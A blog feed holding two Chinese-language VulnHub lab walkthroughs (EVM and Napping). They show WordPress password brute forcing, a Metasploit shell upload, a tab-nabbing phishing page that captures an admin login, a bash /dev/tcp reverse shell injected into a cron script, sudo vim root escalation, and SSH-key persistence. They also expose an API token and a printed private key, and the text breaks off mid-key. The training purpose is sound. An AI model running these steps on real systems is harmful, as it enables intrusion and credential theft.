{
    "version": "https://jsonfeed.org/version/1",
    "title": "X_T • All posts by \"vulnhub 1-10\" tag",
    "description": "人生如逆旅，我亦是行人",
    "home_page_url": "https://n1h1l157.github.io",
    "items": [
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/101%20EVM/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/101%20EVM/",
            "title": "VULNHUB 1 EVM",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZXZtLTEsMzkxLw==\">https://www.vulnhub.com/entry/evm-1,391/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpdmVyMTAwZGF5L2FydGljbGUvZGV0YWlscy8xMTkyNzY3OTc=\">https://blog.csdn.net/liver100day/article/details/119276797</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI：192.168.31.135<br>\n 靶机 EVM：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-000.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.135</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p>3）去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-001.png\" width=\"400\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.155</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A - p 1-1024 192.168.31. 155 - oN /tmp/evm.txt</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-002.png\" alt></p>\n<h3 id=\"wordpress渗透\"><a class=\"markdownIt-Anchor\" href=\"#wordpress渗透\">#</a> wordpress 渗透</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTU1\">http://192.168.31.155</span></p>\n<ol>\n<li>\n<p>观察页面可知存在网址 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy8=\">http://192.168.31.155/wordpress/</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-003.png\" alt></p>\n</li>\n<li>\n<p>对此网站进行目录扫描<br>\n <code>dirsearch -u [http://192.168.31.155](http://192.168.31.155)</code></p>\n</li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-004.png\" width=\"450\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy8=\">http://192.168.31.155/wordpress/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy93cC1sb2dpbi5waHA=\">http://192.168.31.155/wordpress/wp-login.php</span><br>\n-&gt; 对 wordpress 网站渗透扫描</p>\n<ol start=\"3\">\n<li>获取到 wpscan 的 api token：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93cHNjYW4uY29tL3Byb2ZpbGU/cHJpY2luZ0xpc3Q9MQ==\">https://wpscan.com/profile?pricingList=1</span></li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过以下命令枚举wordpress的用户名：</span></span><br><span class=\"line\">wpscan --url http://192.168.31.155/wordpress/ --enumerate u --api-token</span><br><span class=\"line\">eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-005.png\" width=\"570\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过以下命令爆破wordpress用户名c0rrupt3d_brain的密码：</span></span><br><span class=\"line\">wpscan --url [http://192.168.](http://192.168.) 31 .1 55 /wordpress/ - U c0rrupt3d_brain -P</span><br><span class=\"line\">/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-006.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 成功得到 wordpress 网站的用户名：c0rrupt3d_brain ，密码： 24992499</p>\n<h3 id=\"msf攻击wordpress\"><a class=\"markdownIt-Anchor\" href=\"#msf攻击wordpress\">#</a> msf 攻击 wordpress</h3>\n<p>1) 得到账号密码，可以登入后台写入反弹 shell 到任意模板 getshell，<br>\n也可以使用 msf 自带 exploit/unix/webapp/ 下的模块进行利用，因为 msf 方便，这里我选择后者</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用msf自带exploit/unix/webapp/下的模块进行利用</span></span><br><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class=\"line\">set password 24992499</span><br><span class=\"line\">set rhosts 192.168.31.155</span><br><span class=\"line\">set username c0rrupt3d_brain</span><br><span class=\"line\">set targeturi /wordpress</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-007.png\" alt></p>\n<ol start=\"2\">\n<li>获取到标准的 shell</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell</span><br><span class=\"line\">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-008.png\" width=\"500\" alt=\"Image\">\n<p>可以通过 nc 监听，将 shell 从 msf 反弹至一个普通的 terminal<br>\n-&gt; 成功得到一个 www-data 网站用户的 shell</p>\n<h3 id=\"历史遗留文件提权\"><a class=\"markdownIt-Anchor\" href=\"#历史遗留文件提权\">#</a> 历史遗留文件提权</h3>\n<p>查看是否有隐藏文件，判断出哪个文件可能是遗留密码<br>\n这里很明显.root_password_ssh.txt 是 root 密码<br>\n通过 su root 登陆到了 root 账户<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-009.png\" width=\"580\" alt=\"Image\"></p>\n<p>-&gt; 成功得到 root 管理员的 shell</p>\n<h3 id=\"密钥对权限维持\"><a class=\"markdownIt-Anchor\" href=\"#密钥对权限维持\">#</a> 密钥对权限维持</h3>\n<ol>\n<li>服务端写 ssh 公钥，并将私钥文件发送至攻击机</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br><span class=\"line\">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class=\"line\">scp ~/.ssh/id_rsa parallels@192.168.31.135:~/.ssh/vulnhub_evm</span><br><span class=\"line\">rm -f ~/.ssh/id_rsa*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-010.png\" alt></p>\n<ol start=\"2\">\n<li>攻击机保存私钥修改权限，并尝试连接靶机</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 700 vulnhub_evm</span><br><span class=\"line\">ssh root@192.168.31.155 -i ~/.ssh/vulnhub_evm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-011.png\" width=\"500\" alt=\"Image\">\n-> 渗透结束\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/102%20NAPPING/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/102%20NAPPING/",
            "title": "VULNHUB 2 NAPPING",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbmFwcGluZy0xMDEsNzUyLw==\">https://www.vulnhub.com/entry/napping-101,752/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQuZ2l0bGFiLmlvL2hvbWUvdnVsbmh1Yi9uYXBwaW5nLw==\">https://readysetexploit.gitlab.io/home/vulnhub/napping/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-012.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>netdiscover 未发现目标主机，nmap 进一步扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-013.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.170</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A -p 1-1024 192.168.31.170 - oN /tmp/napping.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-014.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"钓鱼攻击web\"><a class=\"markdownIt-Anchor\" href=\"#钓鱼攻击web\">#</a> 钓鱼攻击 web</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcwLw==\">http://192.168.31.170/</span></p>\n<ol>\n<li>观察页面可进行注册并且登陆账号</li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-015.png\" width=\"300\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-016.png\" width=\"300\" alt=\"Image\">\n<ol start=\"2\">\n<li>对此网站进行目录扫描</li>\n</ol>\n<p><code>dirsearch -u http://192.168.31.170</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-017.png\" width=\"400\" alt=\"Image\">\n<p>3）观察登陆后的网站，发现存在跳转漏洞</p>\n<p>审查源代码之后，存在 target=’_blank’ 的代码，可进行利用<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-018.png\" alt></p>\n<p>target=’_blank’漏洞利用：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL3JldmVyc2UtdGFiLW5hYmJpbmc=\">https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-019.png\" width=\"520\" alt=\"Image\"></p>\n<p>-&gt; 观察页面可知，管理员会执行页面上输入的 url 地址</p>\n<ol start=\"4\">\n<li>接受访问着的用户名和密码并发送给 4444 端口，钓鱼管理员</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://192.168.31.170/index.php</span><br><span class=\"line\">cat index.php &amp;&amp; mv index.php index.html</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-020.png\" alt></p>\n<p>现在该站点表明该页面的管理员将查看我们的链接，管员看到的是我们伪造的和对方 index.html 一样的界面，管员有可能认为自己的账号被注销会重新输入账户密码，而由于这是我们构造的界面，对方输入的信息将会被我们所监听。</p>\n<p>evil.html 的作用是重定向，本来的网址是 http://192.168.31.135/evil.html 但是访问<br>\n的这个文件之后将被重定向为 http://192.168.31.135:4444/index.html</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; evil.html &lt;&lt;EOF</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;title&gt;My Blog&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;script&gt;</span><br><span class=\"line\">    if(window.opener)</span><br><span class=\"line\">      window.opener.parent.location.replace(&#x27;http://192.168.31.135:4444/index.html&#x27;);</span><br><span class=\"line\">    if(window.opener != window)</span><br><span class=\"line\">      window.opener.parent.location.replace(&#x27;http://192.168.31.135:4444/index.html&#x27;);</span><br><span class=\"line\">  &lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-021.png\" alt></p>\n<p>提交指向我们 evil.html 链接<br>\n然后点击链接<br>\n我们将转到我们的 evil.html<br>\n 但是原始标签将转到我们的 index.html，它看起来与登录页面完全相同<br>\n确保 Python 服务器在端口 80 和 4444 上运行</p>\n<ol start=\"5\">\n<li>钓鱼攻击，等待鱼儿上钩</li>\n</ol>\n<p>启动 80 端口的 http 服务: python3 -m http.server 80<br>\n 开启 80 服务后，对方可以访问到 http://192.168.31.135/evil.html 并且访问的这<br>\n个文件之后将被重定向为 http://192.168.31.135:4444/index.html</p>\n<p>-&gt; 我们从 4444 端口处监听以便捕捉到对方的用户名和密码！</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-022.png\" width=\"580\" alt=\"Image\">\n<p><code>nc -lvvp 4444</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-023.png\" width=\"500\" alt=\"Image\">\n<p>-&gt; 获得管理员账户：daniel 密码：C@ughtm3napping<br>\n 注意这里的 %40 是 url 编码的 @</p>\n<h3 id=\"定时任务反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#定时任务反弹shell\">#</a> 定时任务反弹 shell</h3>\n<ol>\n<li>得到账号密码，可以登入服务器，ssh <span class=\"exturl\" data-url=\"bWFpbHRvOmRhbmllbEAxOTIuMTY4LjMxLjE3MA==\">daniel@192.168.31.170</span></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-024.png\" width=\"530\" alt=\"Image\">\n<ol start=\"2\">\n<li>观察 /home 文件，分析可提权的文件</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat query.py</span><br><span class=\"line\">cat site_status.txt | head -n 10</span><br><span class=\"line\">tail -n 10 site_status.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-025.png\" width=\"480\" alt=\"Image\">\n<p>对方有一个定时任务，用来检测网站是否正常，如果正常的话，会将日志打印出来，这里我们以 adrian 这个用户执行反弹该用户权限的 shell.</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/dev/shm/是linux下一个非常有用的目录，因为这个目录不在硬盘上，而是在内存里。</span></span><br><span class=\"line\">cat &gt; /dev/shm/shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">chmod +x /dev/shm/shell.sh</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-026.png\" width=\"500\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在query.py中添加此命令，用来执行反弹shell的命令：</span></span><br><span class=\"line\">cat &gt;&gt; query.py &lt;&lt; EOF</span><br><span class=\"line\">import os</span><br><span class=\"line\">os.system(&#x27;/usr/bin/bash /dev/shm/shell.sh&#x27;)</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-027.png\" width=\"400\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听 4444 端口，等待定时任务被执行，shell成功反弹出来</span></span><br><span class=\"line\">nc - lvvp 4444</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过下面的命令来把终端标准一点显示：</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; then press Ctrl+Z</span><br><span class=\"line\">stty raw -echo;fg then press ENTER twice</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-028.png\" width=\"550\" alt=\"Image\">\n<h3 id=\"vim-shell提权\"><a class=\"markdownIt-Anchor\" href=\"#vim-shell提权\">#</a> vim-shell 提权</h3>\n<p>列出用户权限或检查特定命令<br>\n <code>sudo -l</code> <br>\n 这里发现有可调用 root 执行无密码的 vim 命令</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-029.png\" alt></p>\n<p>提权超级丰富的网址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v\">https://gtfobins.github.io/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">直接写一个 vim shell</span><br><span class=\"line\">sudo vim -c ‘:!/bin/sh’ 表示以root权限去写vim shell</span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-030.png\" width=\"550\" alt=\"Image\">\n<h3 id=\"篡改authorized_keys维权\"><a class=\"markdownIt-Anchor\" href=\"#篡改authorized_keys维权\">#</a> 篡改 authorized_keys 维权</h3>\n<p>靶机：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">给靶机打印公钥</span></span><br><span class=\"line\">echo &#x27;ssh-rsa</span><br><span class=\"line\">AAAAB3NzaC1yc2EAAAADAQABAAABgQCysSKgDq+5dEpirNHGl2j+ceqNRQHnSAHgQ3zsKqmUn9iyks</span><br><span class=\"line\">5L07z9Y34OEvUsYAxsFgdLtdD+MxufPPQwj8a77hmcqWguq5EmJUiZ7fA/peddvGR9Q5ypMpkuMFm2W2gIg</span><br><span class=\"line\">kVG+b4XPCQ0ydC9gn8ac7dReeMIykcD+vcQgpvHniK45rqAJJwbnb9MxNGDuPQHlSCSGA3FtHayNNsAmC</span><br><span class=\"line\">+ek1m2Qk3oVUF/8XGnjHvw2fMTog8h41Se8lYgHLDf8o4IibuOxxxpNVYOIgUZ0Ahvg9+srGvzquDS/yqXDf</span><br><span class=\"line\">06aBGHj+ISjOZ9wrB/Qmg3ArylKCaRk8UztsXg4gkCKiGiAynYY/EqNzXAuR42A1lby+kf9FUwSXGp8wdRG</span><br><span class=\"line\">YVc3yOWQm+lHy5Ov1RqdSCsMMYkyqAOV+2weoRki9iONN8h7YVWX9hBoVPpRiLKDfG3aLkjRVyPrpx</span><br><span class=\"line\">+qVHNo8rYHI9zjiTAhM/PJFarLhMEg+e3AvbEPBCN6p5lmO3lAdXX40= root@earth&#x27; &gt;&gt;</span><br><span class=\"line\">~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>攻击机：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">给攻击机打印私钥，注意私钥里边的第一行不能有空行</span></span><br><span class=\"line\">echo &#x27;</span><br><span class=\"line\">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class=\"line\">NhAAAAAwEAAQAAAYEAsrEioA6vuXRKYqzRxpdo/nHqjUUB50gB4EN87CqplJ/YspLOS9O</span><br><span class=\"line\">/WN+DhL1LGAMbBYHS7XQ/jMbnzz0MI/Gu+4ZnKloLquRJiVIme3wP6XnXbxkfUOcqTKZLj</span><br><span class=\"line\">BZtltoCIJFRvm+FzwkNMnQvYJ/GnO3UXnjCMpHA/r3EIKbx54iuOa6gCScG52/TMTRg7j</span><br><span class=\"line\">B5UgkhgNxbR2sjTbAJgvnpNZtkJN6FVBf/Fxp4x78NnzE6IPIeNUnvJWIByw3/KOCIm7js</span><br><span class=\"line\">ccaTVWDiIFGdAIb4PfrKxr86rg0v8qlw3/dOmgRh4/iEozmfcKwf0JoNwK8pSgmkZPFM7b</span><br><span class=\"line\">F4OIJAiohogMp2GPxKjc1wLkeNgNZW8vpH/RVMElxqfMHURmFXN8jlkJvpR8uTr9UanUgr</span><br><span class=\"line\">DDGJMqgDlftsHqEZIvYjjTfIe2FVl/YQaFT6UYiyg3xt2i5I0Vcj66cfqlRzaPK2ByPc</span><br><span class=\"line\">kwITPzyRWqy4TBIPntwL2xDwQjeqeZZjt5QHV1+NAAAFgL9tgH2/bYB9AAAAB3NzaC1yc</span><br><span class=\"line\">EAAAGBALKxIqAOr7l0SmKs0caXaP5x6o1FAedIAeBDfOwqqZSf2LKSzkvTvP1jfg4S9Sxg</span><br><span class=\"line\">DGwWB0u10P4zG5889DCPxrvuGZypaC6rkSYlSJnt8D+l5128ZH1DnKkymS4wWbZbaAiCRU</span><br><span class=\"line\">b5vhc8JDTJ0L2Cfxpzt1F54wjKRwP69xCCm8eeIrjmuoAknBudv0zE0YO49AeVIJIYDcW</span><br><span class=\"line\">drI02wCYL56TWbZCTehVQX/xcaeMe/DZ8xOiDyHjVJ7yViAcsN/yjgiJu47HHGk1Vg4iBR</span><br><span class=\"line\">nQCG+D36ysa/Oq4NL/KpcN/3TpoEYeP4hKM5n3CsH9CaDcCvKUoJpGTxTO2xeDiCQIqIaI</span><br><span class=\"line\">DKdhj8So3NcC5HjYDWVvL6R/0VTBJcanzB1EZhVzfI5ZCb6UfLk6/VGp1IKwwxiTKoA5X</span><br><span class=\"line\">bB6hGSL2I403yHthVZf2EGhU+lGIsoN8bdouSNFXI+unH6pUc2jytgcj3OOJMCEz88kVqs</span><br><span class=\"line\">uEwSD57cC9sQ8EI3qnmWY7eUB1dfjQAAAAMBAAEAAAGBAJ6lZ5FlGJx1Y6lRt/kx6hSlfN</span><br><span class=\"line\">Gpp7P4GTpLkLh4dBCxDgoVDrUBqvPohjzmlees6rp3oEiWhpN5OpfY3Q/URmQJU5HkUcvF</span><br><span class=\"line\">pNuSFHAdcMSBffWZ0jnocklB0//PC4c8hhOv3OPTzPICAj8fwoTOPBx3ChV7OpdOR1iAUy</span><br><span class=\"line\">PEYZwLiNZSethUKIjYN8RnpX/mEDo/Kyip1Ghn/U3gYWOYugZ22hpXqaWRM9LswLQ5pLxE</span><br><span class=\"line\">NGyE4Bx9IV7w1ogyENLzG60Eycb80YF7UX1a3wwT1MmhdXTHe23mPZ0NAS0vXgX/Z5za7Y</span><br><span class=\"line\">mZhSvWyEY9OSuscnQMARLD07y8lmCiMvdpy/u7mEM9xq+qy/1RpAi+b1xFifZPjvTSKPpz</span><br><span class=\"line\">+UXrQXhInPY20mUX6UtJtzK6uH4wbfhewSaBG/QKCTJwmqWWuGOO/juBfdrESvBkrRXRrX</span><br><span class=\"line\">XjKnGo1/3KCYegY6lnLZdYIFGLchDQSsoAcRojLSarMDR/GS2p4UJqU2eGLlGDG+4PfQAA</span><br><span class=\"line\">AMASNt36l5t/f9gR/6qD+WVARaYc8EvlczrR6TiWNGd0UUti31Px9PKFETku/hWcHLjlRS</span><br><span class=\"line\">BJxxMm0uMbBgh+oiOHlIcJz5PRuKHzC48kn/n8YcPs7C00UiR4JuQzxMQuJPXYntaks/YU</span><br><span 